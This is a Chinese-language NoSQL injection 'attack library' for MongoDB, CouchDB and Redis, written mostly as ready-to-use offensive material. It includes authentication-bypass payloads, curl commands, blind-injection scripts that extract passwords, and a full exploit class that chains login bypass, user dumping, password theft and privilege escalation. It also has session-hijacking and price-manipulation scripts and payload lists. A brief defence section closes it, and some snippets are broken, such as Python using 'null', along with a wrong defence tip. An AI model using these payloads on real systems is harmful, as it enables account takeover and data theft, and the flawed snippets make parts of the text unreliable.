# NoSQL注入 攻击库

## 漏洞概述

NoSQL注入是针对NoSQL数据库(如MongoDB、CouchDB、Redis、Cassandra)的注入攻击。与传统SQL注入类似,NoSQL注入利用应用程序对用户输入验证不足的漏洞,但利用方式适应NoSQL数据库的查询语法和数据结构。

**常见NoSQL数据库**:
- MongoDB (最常见)
- CouchDB
- Redis
- Cassandra
- Neo4j
- Elasticsearch

**攻击价值**:
- 认证绕过
- 数据泄露
- 权限提升
- 拒绝服务
- 远程代码执行(某些情况下)

## MongoDB注入技术

### 1. 认证绕过 - 操作符注入

**原理**: MongoDB使用操作符(如$ne、$gt)进行查询,注入恶意操作符可绕过认证

**场景**: 登录表单验证

**正常查询**:
```javascript
db.users.find({
    username: "admin",
    password: "user_password"
})
```

**注入攻击**:

**方法1: $ne (不等于)操作符**
```json
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": "admin",
    "password": {"$ne": null}
}
```

后端构造的查询变为:
```javascript
db.users.find({
    username: "admin",
    password: {$ne: null}
})
```
这会匹配password字段不为null的所有文档,绕过密码验证!

**方法2: $gt (大于)操作符**
```json
{
    "username": "admin",
    "password": {"$gt": ""}
}
```

**方法3: $regex操作符**
```json
{
    "username": "admin",
    "password": {"$regex": ".*"}
}
```

**cURL示例**:
```bash
# $ne注入
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}'

# $gt注入
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'
```

**URL参数注入**:
```
http://target.com/login?username=admin&password[$ne]=
http://target.com/login?username=admin&password[$gt]=
http://target.com/login?username[$ne]=invalid&password[$ne]=invalid
```

### 2. 数据提取 - 盲注技术

**场景**: 无回显注入,通过布尔盲注提取数据

**正则表达式盲注**:

```python
#!/usr/bin/env python3
"""
MongoDB盲注 - 提取管理员密码
"""
import requests
import string

def blind_injection(url):
    """通过正则表达式盲注提取密码"""
    password = ""
    charset = string.ascii_letters + string.digits + "!@#$%^&*"
    
    print("[*] 开始盲注攻击...")
    
    while True:
        found = False
        for char in charset:
            # 构造正则表达式
            regex = f"^{password}{char}"
            
            payload = {
                "username": "admin",
                "password": {"$regex": regex}
            }
            
            r = requests.post(
                url,
                json=payload,
                timeout=10
            )
            
            # 根据响应判断是否正确
            if "success" in r.text.lower() or r.status_code == 200:
                password += char
                print(f"\r[+] 密码: {password}", end="", flush=True)
                found = True
                break
        
        if not found:
            print(f"\n[+] 完整密码: {password}")
            return password
        
        # 防止无限循环
        if len(password) > 50:
            break
    
    return password

# 使用
url = "http://target.com/login"
password = blind_injection(url)
```

**基于时间的盲注**:

```javascript
// MongoDB JavaScript注入
db.users.find({
    username: "admin",
    $where: "sleep(5000) || this.password == 'test'"
})
```

```python
import time

def time_based_injection(url):
    """基于时间的盲注"""
    password = ""
    
    for position in range(1, 20):
        for char in string.printable:
            payload = {
                "username": "admin",
                "$where": f"sleep(this.password[{position-1}] == '{char}' ? 5000 : 0) || true"
            }
            
            start = time.time()
            r = requests.post(url, json=payload)
            elapsed = time.time() - start
            
            if elapsed > 5:
                password += char
                print(f"\r[+] 密码: {password}", end="")
                break
    
    return password
```

### 3. JavaScript注入 - $where操作符

**危险性**: MongoDB的$where允许执行JavaScript代码

**基本注入**:

```json
{
    "username": "admin",
    "$where": "this.password == 'anything' || '1'=='1'"
}
```

**命令执行**:
```json
{
    "$where": "this.password == 'x'; return true; //"
}
```

**数据提取**:
```json
{
    "$where": "this.password.match(/^admin/)"
}
```

**拒绝服务**:
```json
{
    "$where": "while(true){}"
}
```

**完整示例**:
```python
def javascript_injection(url):
    """JavaScript注入攻击"""
    
    # 1. 绕过认证
    payload1 = {
        "username": "admin",
        "$where": "return true"
    }
    
    # 2. 提取数据
    payload2 = {
        "$where": "this.role == 'admin'"
    }
    
    # 3. 条件判断
    payload3 = {
        "$where": "this.password.substring(0,1) == 'a'"
    }
    
    for payload in [payload1, payload2, payload3]:
        r = requests.post(url, json=payload)
        print(f"[*] Payload: {payload}")
        print(f"[*] 响应: {r.status_code}")
```

### 4. 数组操作符注入

**$in操作符**:
```json
{
    "username": {"$in": ["admin", "root", "administrator"]},
    "password": {"$ne": null}
}
```

**$nin操作符**:
```json
{
    "username": {"$nin": ["guest", "anonymous"]},
    "password": {"$gt": ""}
}
```

**$all操作符**:
```json
{
    "permissions": {"$all": ["read", "write", "admin"]}
}
```

### 5. 逻辑操作符注入

**$or操作符**:
```json
{
    "$or": [
        {"username": "admin"},
        {"role": "administrator"}
    ],
    "password": {"$ne": null}
}
```

**$and操作符**:
```json
{
    "$and": [
        {"username": {"$ne": "guest"}},
        {"password": {"$ne": null}}
    ]
}
```

**$nor操作符**:
```json
{
    "$nor": [
        {"role": "guest"},
        {"active": false}
    ]
}
```

### 6. 聚合管道注入

**场景**: 应用使用MongoDB聚合查询

```javascript
// 正常聚合
db.orders.aggregate([
    { $match: { customer: "user123" } },
    { $group: { _id: "$status", total: { $sum: "$amount" } } }
])

// 注入攻击
db.orders.aggregate([
    { $match: { customer: {"$ne": null} } },  // 获取所有订单
    { $group: { _id: "$customer", total: { $sum: "$amount" } } }
])
```

**payload**:
```json
{
    "customer": {"$ne": null},
    "$group": {
        "_id": "$customer",
        "passwords": {"$push": "$password"}
    }
}
```

## CouchDB注入技术

### 1. 视图注入

**原理**: CouchDB使用MapReduce视图,可注入恶意JavaScript

```javascript
// 正常视图
{
    "map": "function(doc) { if(doc.user == 'admin') emit(doc._id, doc); }"
}

// 注入攻击
{
    "map": "function(doc) { emit(doc._id, doc); }"
}
```

### 2. Mango查询注入

```json
{
    "selector": {
        "username": "admin",
        "password": {"$ne": null}
    }
}
```

## Redis注入技术

### 1. 命令注入

**场景**: 应用拼接Redis命令

```python
# 危险代码
user_input = request.GET['key']
redis_client.execute_command(f"GET {user_input}")

# 注入攻击
# key=mykey\r\nCONFIG SET dir /var/www/html\r\n
# 执行多个命令
```

### 2. Lua脚本注入

```lua
-- 正常Lua脚本
EVAL "return redis.call('GET', KEYS[1])" 1 user:123

-- 注入攻击
EVAL "return redis.call('KEYS', '*')" 0
```

## 完整利用场景

### 场景1: 登录绕过到数据库完全控制

```python
#!/usr/bin/env python3
"""
完整的MongoDB注入攻击链
"""
import requests
import json

class MongoDBExploiter:
    def __init__(self, target_url):
        self.url = target_url
        self.session = requests.Session()
    
    def bypass_login(self):
        """步骤1: 绕过登录"""
        print("[*] 步骤1: 尝试绕过登录...")
        
        payloads = [
            {"username": "admin", "password": {"$ne": null}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        ]
        
        for payload in payloads:
            r = self.session.post(
                f"{self.url}/login",
                json=payload
            )
            
            if "success" in r.text.lower() or r.status_code == 200:
                print(f"[+] 登录成功! Payload: {payload}")
                return True
        
        return False
    
    def extract_users(self):
        """步骤2: 提取用户列表"""
        print("[*] 步骤2: 提取用户数据...")
        
        # 使用$ne枚举用户
        payload = {
            "username": {"$ne": null},
            "password": {"$ne": null}
        }
        
        r = self.session.post(
            f"{self.url}/api/users",
            json=payload
        )
        
        if r.status_code == 200:
            users = r.json()
            print(f"[+] 找到 {len(users)} 个用户")
            return users
        
        return []
    
    def extract_password(self, username):
        """步骤3: 提取特定用户密码"""
        print(f"[*] 步骤3: 提取 {username} 的密码...")
        
        password = ""
        charset = "abcdefghijklmnopqrstuvwxyz0123456789"
        
        for position in range(20):
            found = False
            for char in charset:
                regex = f"^{password}{char}"
                
                payload = {
                    "username": username,
                    "password": {"$regex": regex}
                }
                
                r = self.session.post(
                    f"{self.url}/login",
                    json=payload
                )
                
                if r.status_code == 200:
                    password += char
                    print(f"\r[+] 密码: {password}", end="", flush=True)
                    found = True
                    break
            
            if not found:
                break
        
        print()
        return password
    
    def escalate_privileges(self):
        """步骤4: 权限提升"""
        print("[*] 步骤4: 尝试权限提升...")
        
        # 修改用户角色
        payload = {
            "$where": "this.username == 'attacker'; this.role = 'admin'; return true;"
        }
        
        r = self.session.post(
            f"{self.url}/api/update",
            json=payload
        )
        
        if r.status_code == 200:
            print("[+] 权限提升成功!")
            return True
        
        return False
    
    def run_full_exploit(self):
        """运行完整攻击链"""
        print("[*] 开始完整攻击链...")
        print(f"[*] 目标: {self.url}\n")
        
        # 步骤1: 绕过登录
        if not self.bypass_login():
            print("[-] 登录绕过失败")
            return False
        
        # 步骤2: 提取用户列表
        users = self.extract_users()
        
        # 步骤3: 提取密码
        if users:
            for user in users[:3]:  # 提取前3个用户
                username = user.get('username', 'unknown')
                password = self.extract_password(username)
                print(f"[+] {username}: {password}")
        
        # 步骤4: 权限提升
        self.escalate_privileges()
        
        print("\n[+] 攻击完成!")
        return True

# 使用
if __name__ == "__main__":
    target = "http://target.com"
    exploiter = MongoDBExploiter(target)
    exploiter.run_full_exploit()
```

### 场景2: 电商应用价格操纵

```python
def price_manipulation():
    """修改商品价格"""
    
    # 正常请求
    normal = {
        "product_id": "12345",
        "price": 1000
    }
    
    # 注入攻击 - 将所有商品价格改为1
    payload = {
        "product_id": {"$ne": null},
        "$set": {"price": 1}
    }
    
    requests.post(
        "http://shop.com/api/update_price",
        json=payload
    )
```

### 场景3: 会话劫持

```python
def session_hijacking():
    """窃取其他用户的会话"""
    
    # 查询所有活跃会话
    payload = {
        "active": true,
        "user": {"$ne": "current_user"}
    }
    
    r = requests.post(
        "http://target.com/api/sessions",
        json=payload
    )
    
    sessions = r.json()
    
    # 使用其他用户的session_id
    for session in sessions:
        cookies = {"session_id": session['session_id']}
        r = requests.get(
            "http://target.com/admin",
            cookies=cookies
        )
        print(f"[*] 使用session: {session['session_id'][:20]}...")
        print(f"[*] 响应: {r.status_code}")
```

## 自动化检测工具

### 1. NoSQLMap

```bash
# 安装
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap

# 使用
python nosqlmap.py -u "http://target.com/login" \
  --post "username=admin&password=test" \
  --attack 1  # MongoDB注入
```

### 2. 自定义扫描脚本

```python
#!/usr/bin/env python3
"""
NoSQL注入检测脚本
"""
import requests

class NoSQLScanner:
    def __init__(self, url):
        self.url = url
        self.vulnerabilities = []
    
    def test_operator_injection(self):
        """测试操作符注入"""
        print("[*] 测试操作符注入...")
        
        operators = ['$ne', '$gt', '$gte', '$lt', '$lte', '$regex']
        
        for op in operators:
            payloads = [
                {f"username": "admin", "password": {op: null}},
                {f"username": "admin", "password": {op: ""}},
                {f"username": {op: ""}, "password": {op: ""}},
            ]
            
            for payload in payloads:
                try:
                    r = requests.post(
                        self.url,
                        json=payload,
                        timeout=5
                    )
                    
                    if r.status_code == 200 and "success" in r.text.lower():
                        vuln = f"操作符注入: {op} - {payload}"
                        print(f"[+] 发现漏洞: {vuln}")
                        self.vulnerabilities.append(vuln)
                except:
                    continue
    
    def test_javascript_injection(self):
        """测试JavaScript注入"""
        print("[*] 测试JavaScript注入...")
        
        payloads = [
            {"$where": "return true"},
            {"$where": "1 == 1"},
            {"$where": "this.password == 'x' || '1'=='1'"},
        ]
        
        for payload in payloads:
            try:
                r = requests.post(self.url, json=payload, timeout=5)
                if r.status_code == 200:
                    vuln = f"JavaScript注入: {payload}"
                    print(f"[+] 发现漏洞: {vuln}")
                    self.vulnerabilities.append(vuln)
            except:
                continue
    
    def test_timing_attack(self):
        """测试基于时间的注入"""
        print("[*] 测试基于时间的注入...")
        
        payload = {
            "$where": "sleep(5000) || true"
        }
        
        import time
        start = time.time()
        
        try:
            r = requests.post(self.url, json=payload, timeout=10)
            elapsed = time.time() - start
            
            if elapsed > 5:
                vuln = "基于时间的JavaScript注入"
                print(f"[+] 发现漏洞: {vuln}")
                self.vulnerabilities.append(vuln)
        except:
            pass
    
    def scan(self):
        """执行完整扫描"""
        print(f"[*] 开始扫描: {self.url}\n")
        
        self.test_operator_injection()
        self.test_javascript_injection()
        self.test_timing_attack()
        
        print(f"\n[*] 扫描完成")
        print(f"[*] 发现 {len(self.vulnerabilities)} 个漏洞")
        
        return self.vulnerabilities

# 使用
scanner = NoSQLScanner("http://target.com/login")
vulns = scanner.scan()
```

### 3. Burp Suite检测

**手动测试**:
1. 拦截POST请求
2. 修改JSON参数:
```json
{
    "username": "admin",
    "password": {"$ne": null}
}
```
3. 观察响应变化

**使用Intruder**:
```
Position: password字段
Payloads:
{"$ne":null}
{"$gt":""}
{"$regex":".*"}
{"$ne":""}
```

## 实战Payload集合

### MongoDB认证绕过Payloads

```json
// 基本绕过
{"username":"admin","password":{"$ne":null}}
{"username":"admin","password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}

// 正则表达式
{"username":"admin","password":{"$regex":".*"}}
{"username":"admin","password":{"$regex":"^.*$"}}

// $in操作符
{"username":{"$in":["admin","root"]},"password":{"$ne":null}}

// $or操作符
{"$or":[{"username":"admin"},{"username":"root"}],"password":{"$ne":null}}

// JavaScript注入
{"username":"admin","$where":"return true"}
{"username":"admin","$where":"this.password.match(/.*/)"}
```

### URL编码Payloads

```
username=admin&password[$ne]=
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=^admin$&password[$ne]=
```

### 数据提取Payloads

```json
// 提取所有用户
{"username":{"$ne":null}}

// 提取管理员
{"role":"admin"}
{"role":{"$in":["admin","superuser"]}}

// 正则匹配
{"username":{"$regex":"^a"}}
{"email":{"$regex":"@admin.com$"}}
```

## 防御措施

### 1. 输入验证与清理

```javascript
// 错误的方式
app.post('/login', (req, res) => {
    const {username, password} = req.body;
    
    // 直接使用用户输入 - 危险!
    db.users.findOne({username, password}, callback);
});

// 正确的方式
app.post('/login', (req, res) => {
    const {username, password} = req.body;
    
    // 确保输入是字符串
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({error: '无效输入'});
    }
    
    // 使用参数化查询
    db.users.findOne({
        username: username,
        password: password
    }, callback);
});
```

### 2. 类型检查

```javascript
function validateInput(data) {
    // 拒绝对象类型
    if (typeof data === 'object') {
        throw new Error('不接受对象类型');
    }
    
    // 只接受字符串
    if (typeof data !== 'string') {
        throw new Error('只接受字符串');
    }
    
    return data;
}

app.post('/login', (req, res) => {
    try {
        const username = validateInput(req.body.username);
        const password = validateInput(req.body.password);
        
        db.users.findOne({username, password}, callback);
    } catch (e) {
        res.status(400).json({error: e.message});
    }
});
```

### 3. 使用ORM/ODM

```javascript
// 使用Mongoose (MongoDB ODM)
const UserSchema = new mongoose.Schema({
    username: {type: String, required: true},
    password: {type: String, required: true},
    role: {type: String, default: 'user'}
});

const User = mongoose.model('User', UserSchema);

// 安全的查询
User.findOne({
    username: req.body.username,
    password: req.body.password
}).exec((err, user) => {
    if (user) {
        // 登录成功
    }
});
```

### 4. 禁用危险操作符

```javascript
// MongoDB配置
// 禁用$where操作符
db.system.js.save({
    _id: "dangerous",
    value: function() { return false; }
});
```

### 5. 最小权限原则

```javascript
// 数据库用户只有读权限,不能执行$where
db.createUser({
    user: "webApp",
    pwd: "securePassword",
    roles: [{role: "read", db: "myDatabase"}]
});
```

## 参考资源

- [OWASP NoSQL Injection](https://owasp.org/www-community/attacks/NoSQL_injection)
- [MongoDB Security Checklist](https://docs.mongodb.com/manual/administration/security-checklist/)
- [NoSQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

---

**最后更新**: 2025-11-16
**适用场景**: MongoDB、CouchDB、Redis等NoSQL数据库应用
**攻击难度**: 简单到中等
**检测难度**: 需要理解不同NoSQL数据库的查询语法
